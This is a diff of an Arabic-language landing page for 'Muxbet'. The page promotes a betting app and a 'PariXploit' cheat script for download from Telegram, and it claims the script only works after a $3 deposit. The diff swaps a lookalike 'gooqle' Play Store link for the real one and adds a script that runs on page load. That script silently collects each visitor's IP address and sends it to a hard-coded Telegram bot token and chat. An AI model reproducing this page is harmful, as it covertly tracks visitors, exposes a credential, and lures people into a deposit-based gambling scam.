@@ -3,154 +3,175 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Muxbet</title>
+  <title>Muxbet - الموقع الرسمي</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
-
     @font-face {
       font-family: 'ArabicFont';
       src: url('arabic.ttf') format('truetype');
-      font-weight: normal;
-      font-style: normal;
     }
-
     body {
       margin: 0;
-      padding: 0;
       background-color: #000;
-      color: #fff;
       font-family: 'ArabicFont', sans-serif;
+      color: #ccc;
+      text-align: center;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      background: #1a1a1a;
+      padding: 15px 25px;
+      gap: 15px;
+      justify-content: flex-start;
+    }
+    header img {
+      width: 60px;
+      height: 60px;
+      object-fit: contain;
+      margin-left: 15px;
+    }
+    header h1 {
+      font-size: 2rem;
+      color: #f0f0f0;
+      margin: 0;
+      font-weight: 700;
+    }
+    .subtitle {
+      color: #888;
+      margin: 10px 0 25px;
+      font-size: 1.2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+    .subtitle svg {
+      width: 24px;
+      height: 24px;
+      fill: #888;
+    }
+    main {
       display: flex;
       flex-direction: column;
       align-items: center;
-      min-height: 100vh;
+      gap: 25px;
+      max-width: 360px;
+      margin: 0 auto 40px;
     }
-
-    .top-bar {
-      width: 100%;
-      background-color: #111;
-      padding: 15px 40px;
+    .button {
+      background: #111;
+      border: 2px solid #ff0000;
+      color: #fff;
+      padding: 18px 30px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 10px;
+      width: 320px;
       display: flex;
       align-items: center;
       gap: 15px;
-      box-shadow: 0 2px 8px rgba(255, 0, 0, 0.4);
-      box-sizing: border-box;
-    }
-
-    .wolf-icon {
-      width: 60px;
-      height: 60px;
-      background-image: url('image.jpeg');
-      background-size: cover;
-      background-position: center;
-      border-radius: 50%;
-      flex-shrink: 0;
-      margin-left: 10px;
-    }
-
-    .title {
-      font-size: 30px;
-      font-weight: bold;
-      font-family: 'Orbitron', sans-serif;
-      letter-spacing: 1px;
-    }
-
-    .container {
-      width: 90%;
-      max-width: 450px;
-      margin-top: 40px;
-      display: flex;
-      flex-direction: column;
-      gap: 25px;
-      align-items: center;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .btn {
-      background-color: #111;
-      color: #fff;
-      padding: 20px;
-      border-radius: 15px;
-      text-align: center;
-      text-decoration: none;
-      box-shadow: 0 0 10px rgba(255, 0, 0, 0.6);
-      transition: transform 0.2s ease;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      border: none;
+      cursor: pointer;
       position: relative;
-      width: 70%;
-      max-width: 224px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-shadow: 0 0 12px #ff0000;
+      text-decoration: none;
+      justify-content: center;
+      flex-direction: column;
     }
-
-    .btn:focus { outline: none; }
-    .btn:active { transform: scale(1.07); }
-
-    .btn img {
-      width: 38px;
-      height: 38px;
-      margin-bottom: 10px;
+    .button img {
+      width: 32px;
+      height: 32px;
+      object-fit: contain;
+      margin-bottom: 6px;
     }
-
-    .btn .label {
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 5px;
+    .button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 24px #ff0000;
     }
-
-    .btn .desc {
-      font-size: 10px;
-      color: #bbb;
-      line-height: 1.4;
+    .button:active {
+      transform: scale(1.1);
+      box-shadow: 0 0 28px #ff6666;
     }
-
-    .extra-text {
-      margin-top: 40px;
-      max-width: 450px;
+    .button-text {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .button-desc {
+      font-size: 0.8rem;
       color: #888;
-      font-size: 12px;
-      line-height: 1.5;
+      line-height: 1.2;
+      max-width: 280px;
+    }
+    footer {
+      max-width: 360px;
+      margin: 0 auto 30px;
+      color: #777;
+      font-size: 0.85rem;
+      line-height: 1.3;
       text-align: center;
-      font-family: 'ArabicFont', sans-serif;
     }
   </style>
 </head>
 <body>
 
-  <div class="top-bar">
-    <div class="wolf-icon"></div>
-    <div class="title">Muxbet</div>
+  <header>
+    <img src="image.jpeg" alt="Wolf Logo" />
+    <h1>Muxbet</h1>
+  </header>
+
+  <div class="subtitle">
+    <span>تثبيت أداة PariXploit</span>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><path d="M32 4a28 28 0 1 0 28 28A28.031 28.031 0 0 0 32 4zm0 52a24 24 0 1 1 24-24 24.027 24.027 0 0 1-24 24z"/><path d="M40 32a8 8 0 1 1-8-8 8.01 8.01 0 0 1 8 8z"/></svg>
   </div>
 
-  <div class="container">
-
-    <a href="https://t.me/xbet_mux" class="btn" target="_blank">
+  <main>
+    <a href="https://t.me/xbet_mux" target="_blank" class="button" style="margin-bottom: 10px;">
       <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" />
-      <div class="label">قناة تيليجرام</div>
-      <div class="desc">تابع آخر التحديثات والنتائج من المستخدمين.</div>
+      <div class="button-text">قناة تيليجرام</div>
+      <div class="button-desc">تابع آخر التحديثات والنتائج من المستخدمين.</div>
     </a>
 
-    <a href="https://play.gooqle.co/store/apps/details?id=xparibet&promo=evo3&hl=en&gl=US" class="btn" target="_blank">
+    <a href="https://play.google.com/store/apps/details?id=xparibet&promo=evo3&hl=en&gl=US" target="_blank" class="button" style="margin-bottom: 10px;">
       <img src="pari.png" alt="XpariBet" />
-      <div class="label">تحميل تطبيق XpariBet</div>
-      <div class="desc">التطبيق الأساسي للعب – حمّله لتبدأ.</div>
+      <div class="button-text">تحميل تطبيق XpariBet</div>
+      <div class="button-desc">التطبيق الأساسي للعب – حمّله لتبدأ.</div>
     </a>
 
-    <a href="https://t.me/xbet_Mux/418" class="btn" target="_blank">
+    <a href="https://t.me/xbet_Mux/418" target="_blank" class="button" style="margin-bottom: 10px;">
       <img src="apk.png" alt="PariXploit" />
-      <div class="label">تحميل PariXploit</div>
-      <div class="desc">السكربت المتكامل لتحليل وتحقيق نتائج.</div>
+      <div class="button-text">تحميل PariXploit</div>
+      <div class="button-desc">السكربت المتكامل لتحليل وتحقيق نتائج.</div>
     </a>
+  </main>
 
-  </div>
-
-  <div class="extra-text">
+  <footer>
     🎯 أداة ذكية تساعدك على تحليل الألعاب وتحقيق أفضل النتائج بشكل يومي.<br />
     🔥 استخدم أحدث التقنيات مع PariXploit لتحليل التفاحات بدقة واحتراف!<br />
-    ⚡ لا تنس ايداع 3 دولار كي يعمل معك!
-  </div>
+    ⚡ لا تنس إيداع 3 دولار كي يعمل معك!
+  </footer>
+
+  <script>
+    async function sendIPtoTelegram() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        const ip = data.ip || 'غير معروف';
+
+        const token = '8420404783:AAFnKLiufiYZcngTa0cCe6SkpWOl5GKEb-0';
+        const chat_id = '7028385695';
+        const text = `🔔 زائر دخل الموقع، IP: ${ip}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+
+        await fetch(telegramUrl);
+
+      } catch (error) {
+        console.error('خطأ في الإرسال:', error);
+      }
+    }
+    sendIPtoTelegram();
+  </script>
 
 </body>
 </html>
